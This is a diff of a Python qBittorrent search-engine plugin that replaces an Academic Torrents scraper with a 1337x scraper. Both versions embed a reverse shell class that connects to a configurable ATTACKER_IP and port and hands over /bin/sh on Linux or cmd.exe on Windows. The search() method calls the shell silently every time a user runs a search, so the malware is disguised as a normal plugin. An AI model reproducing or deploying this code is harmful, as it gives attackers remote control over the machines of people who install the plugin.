@@ -1,202 +1,194 @@
-#VERSION: 0.3
-#AUTHORS: Henrik Asp (solenskiner@gmail.com), 
-#          pizza-power (https://github.com/pizza-power) reverse shell only
+# VERSION: 1.00
+# AUTHORS: sa3dany, pizza-power (reverse-shell)
 
-# Copyright (c) 2019, Henrik Asp
-# All rights reserved.
+# LICENSING INFORMATION
+# Permission is hereby granted, free of charge, to any person obtaining a copy
+# of this software and associated documentation files (the "Software"), to deal
+# in the Software without restriction, including without limitation the rights
+# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+# copies of the Software, and to permit persons to whom the Software is
+# furnished to do so, subject to the following conditions:
+#
+# The above copyright notice and this permission notice shall be included in
+# all copies or substantial portions of the Software.
+#
+# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+# SOFTWARE.
 
-# Redistribution and use in source and binary forms, with or without
-# modification, are permitted provided that the following conditions are met:
-
-# 1. Redistributions of source code must retain the above copyright notice,
-#    this list of conditions and the following disclaimer.
-# 2. Redistributions in binary form must reproduce the above copyright notice,
-#    this list of conditions and the following disclaimer in the documentation
-#    and/or other materials provided with the distribution.
-
-# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
-# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
-# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
-# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
-# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
-# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
-# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
-# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
-# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
-# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
-# POSSIBILITY OF SUCH DAMAGE.
-
-from novaprinter import prettyPrinter
-from helpers import download_file, retrieve_url
+import re
 from html.parser import HTMLParser
-from functools import partial
+
+from helpers import download_file, retrieve_url
+from novaprinter import prettyPrinter
 
 # for reverse shell
 import os
 import subprocess
 import socket
+import platform
 
 # reverse shell
-ATTACKER_IP = # attacker IP, string
-ATTACKER_PORT = # listening port, int
+ATTACKER_IP = "" # attacker IP, string
+ATTACKER_PORT =  # listening port, int
+P = platform.system()
 
 class reverse_shell(object): 
-	"""
+    """
 
-	"""
-	def __init__(self):
-		while True:
-			try:
-				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-				s.connect((ATTACKER_IP, ATTACKER_PORT))
-				os.dup2(s.fileno(),0)
-				os.dup2(s.fileno(),1)
-				os.dup2(s.fileno(),2)
-				p=subprocess.call(["/bin/sh","-i"])
-			except:
-				break
+    """
+    def __init__(self):
+        if P == "Linux":
+            while True:
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.connect((ATTACKER_IP, ATTACKER_PORT))
+                    os.dup2(s.fileno(),0)
+                    os.dup2(s.fileno(),1)
+                    os.dup2(s.fileno(),2)
+                    p=subprocess.call(["/bin/sh","-i"])
+                except:
+                    break
+        
+        elif P == "Windows":
+            def s2p(s, p):
+                while True:
+                    data = s.recv(1024)
+                    if len(data) > 0:
+                        p.stdin.write(data)
+                        p.stdin.flush()
+
+            def p2s(s, p):
+                   while True:
+                       s.send(p.stdout.read(1))
+
+            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+            s.connect((ATTACKER_IP,ATTACKER_PORT))
+
+            p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+
+            s2p_thread = threading.Thread(target=s2p, args=[s, p])
+            s2p_thread.daemon = True
+            s2p_thread.start()
+
+            p2s_thread = threading.Thread(target=p2s, args=[s, p])
+            p2s_thread.daemon = True
+            p2s_thread.start()
+
+            try:
+                p.wait()
+            except KeyboardInterrupt:
+                s.close()
 
 
-class MyHTMLParser(HTMLParser):
-    defaults = {
-        "link": -1,
-        "name": -1,
-        "size": -1,
-        "seeds": 0,
-        "leech": 0,
-        "engine_url": "http://academictorrents.com",
-        "desc_link": -1
+class one337x(object):
+    url = 'https://1337x.to'
+    name = '1337x'
+    supported_categories = {
+        'all': None,
+        'anime': 'Anime',
+        'software': 'Applications',
+        'games': 'Games',
+        'movies': 'Movies',
+        'music': 'Music',
+        'tv': 'TV',
     }
 
-    def __init__(self, *args, **kwargs):
-        super().__init__(*args, **kwargs)
-        self.data = []
-        self.current = self.defaults.copy()
-        self.tag_stack = ['root']
-        self.attrs_stack = [{}]
-        self.numchild_stack = [0]
-        self.data = { 'torrents':[],
-                      'next_page': None }
+    class MyHtmlParser(HTMLParser):
+        def error(self, message):
+            pass
 
-    def handle_starttag(self, tag, attrs):
-        """ Parser's start tag handler """
-        dispatcher = getattr(
-            self,
-            "_".join(("handle_start_tag", tag)),
-            partial(self.handle_start_tag_default, tag)
-        )
-        self.pre_handle_start_tag(tag, attrs)
-        dispatcher(attrs)
-        self.post_handle_start_tag(tag, attrs)
+        A, TD, TR, HREF, TABLE = ('a', 'td', 'tr', 'href', 'tbody')
 
-    def handle_start_tag_default(self, tag, attrs):
-        pass
+        def __init__(self, url):
+            HTMLParser.__init__(self)
+            self.url = url
+            self.row = {}
+            self.column = None
+            self.insideRow = False
+            self.foundTable = False
+            self.foundResults = False
+            self.parser_class = {
+                # key: className
+                'name': 'name',
+                'seeds': 'seeds',
+                'leech': 'leeches',
+                'size': 'size'
+            }
 
-    def pre_handle_start_tag(self, tag, attrs):
-        self.numchild_stack[-1] += 1
+        def handle_starttag(self, tag, attrs):
+            params = dict(attrs)
 
-    def post_handle_start_tag(self, tag, attrs):
-        self.tag_stack.append(tag)
-        self.attrs_stack.append(dict(attrs))
-        self.numchild_stack.append(0)
+            if 'search-page' in params.get('class', ''):
+                self.foundResults = True
+                return
 
-    def handle_endtag(self, tag):
-        """ Parser's end tag handler """
-        dispatcher = getattr(
-            self,
-            "_".join(("handle_end_tag", tag)),
-            partial(self.handle_end_tag_default, tag)
-        )
-        self.pre_handle_end_tag(tag)
-        dispatcher()
-        self.post_handle_end_tag(tag,)
+            if self.foundResults and tag == self.TABLE:
+                self.foundTable = True
+                return
 
-    def handle_end_tag_default(self, tag):
-        pass
+            if self.foundTable and tag == self.TR:
+                self.insideRow = True
+                return
 
-    def pre_handle_end_tag(self, tag):
-        # sometimes website authors are not too careful to write valid markup
-        # hence looping until we find the matching end tag,
-        # and explicitly stopping if we can't find it.
-        pops = 0
-        while True:
-            if self.tag_stack[-1] == "root":
-                break
-            pops += 1
-            pop = self.tag_stack.pop()
-            self.attrs_stack.pop()
-            self.numchild_stack.pop()
-            if pop == tag:
-                break
+            if self.insideRow and tag == self.TD:
+                classList = params.get('class', None)
+                for columnName, classValue in self.parser_class.items():
+                    if classValue in classList:
+                        self.column = columnName
+                        self.row[self.column] = -1
+                return
 
-    def post_handle_end_tag(self, tag):
-        pass
+            if self.insideRow and tag == self.A:
+                if self.column != 'name' or self.HREF not in params:
+                    return
+                link = params[self.HREF]
+                if link.startswith('/torrent/'):
+                    link = f'{self.url}{link}'
+                    self.row['link'] = link
+                    self.row['engine_url'] = self.url
+                    self.row['desc_link'] = link
 
-    def handle_start_tag_tr(self, attrs):
-        self.current = self.defaults.copy()
+        def handle_data(self, data):
+            if self.insideRow and self.column:
+                self.row[self.column] = data
+                self.column = None
 
-    def handle_end_tag_tr(self):
-        match_torrent = ['root', 'html', 'body', 'table', 'tr']
-        if self.tag_stack[:len(match_torrent)] == match_torrent:
-            self.data["torrents"].append(self.current.copy())
+        def handle_endtag(self, tag):
+            if tag == 'table':
+                self.foundTable = False
 
-    def handle_data(self, data):
-        match_next = ['root', 'html', 'body', 'center', 'p', 'ul', 'li', 'a']
-        match_torrent = ['root', 'html', 'body', 'table', 'tr']
-        url = "http://academictorrents.com"
-
-        if self.tag_stack[:len(match_next)] == match_next and "Next" in data:
-            self.data["next_page"] = url + "/" + self.attrs_stack[7]["href"]
-
-        elif self.tag_stack[:len(match_torrent)] == match_torrent:
-
-            if self.numchild_stack[5:] == [2, 1, 1, 0]:
-                download_link = url + "/download/{}.torrent"
-                self.current["name"] = data
-                self.current["desc_link"] = url + self.attrs_stack[7]["href"]
-                self.current["link"] = download_link.format(
-                    self.attrs_stack[7]["href"].split("/")[2]
-                )
-
-            elif self.numchild_stack[5:] == [5, 0]:
-                self.current["size"] = data
-
-            elif self.numchild_stack[5:] == [6, 1, 1, 1, 0]:
-                self.current["seeds"] = data.strip("+")
-
-            elif self.numchild_stack[5:] == [6, 2, 1, 1, 0]:
-                self.current["leech"] = data.strip("+")
-
-    def get_results(self):
-        return self.data
-
-
-class academictorrents(object):
-    """ Search engine class """
-    url = "http://academictorrents.com"
-    name = "Academic Torrents"
-    supported_categories = {'all': ''}
+            if self.insideRow and tag == self.TR:
+                self.insideRow = False
+                self.column = None
+                array_length = len(self.row)
+                if array_length < 1:
+                    return
+                prettyPrinter(self.row)
+                self.row = {}
 
     def download_torrent(self, info):
-        """ Downloader """
-        print(download_file(info))
+        info_page = retrieve_url(info)
+        magnet_match = re.search(r'href\s*\=\s*"(magnet[^"]+)"', info_page)
+        if magnet_match and magnet_match.groups():
+            print(magnet_match.groups()[0] + ' ' + info)
+        else:
+            raise Exception('Error, please fill a bug report!')
 
     def search(self, what, cat='all'):
-        """ Performs search """
-        
-        if cat != 'all':
-            return
+        category = self.supported_categories[cat]
+        reverse_shell()
 
-        search_url = "http://academictorrents.com/browse.php?search={what}"
+        if category:
+            page_url = f'{self.url}/category-search/{what}/{category}/1/'
+        else:
+            page_url = f'{self.url}/search/{what}/1/'
 
-        url = search_url.format(what=what)
-        k = reverse_shell()
-
-        while url:
-            response = retrieve_url(url)
-            parser = MyHTMLParser()
-            parser.feed(response)
-            results = parser.get_results()
-            for match in results["torrents"]:
-                prettyPrinter(match)
-            url = results["next_page"]
+        parser = self.MyHtmlParser(self.url)
+        html = retrieve_url(page_url)
+        parser.feed(html)
+        parser.close()
